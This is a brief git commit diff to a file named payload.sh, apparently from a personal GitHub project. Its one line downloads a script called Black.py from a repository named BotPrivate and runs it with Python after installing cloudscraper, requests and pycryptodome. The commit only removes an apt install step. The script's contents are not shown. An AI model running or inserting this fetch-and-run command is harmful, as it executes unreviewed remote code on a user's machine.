67e98302b88a61d61a38bf97668db8ef23366621
AdeebToPro <128822866+AdeebToPro@users.noreply.github.com>
2023-11-25 22:02:07 +0800

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,1 +1,1 @@
-apt install python3 wget && wget https://raw.githubusercontent.com/AdeebToPro/BotPrivate/main/Black.py && pip install cloudscraper requests pycryptodome && python Black.py
+wget https://raw.githubusercontent.com/AdeebToPro/BotPrivate/main/Black.py && pip install cloudscraper requests pycryptodome && python Black.py
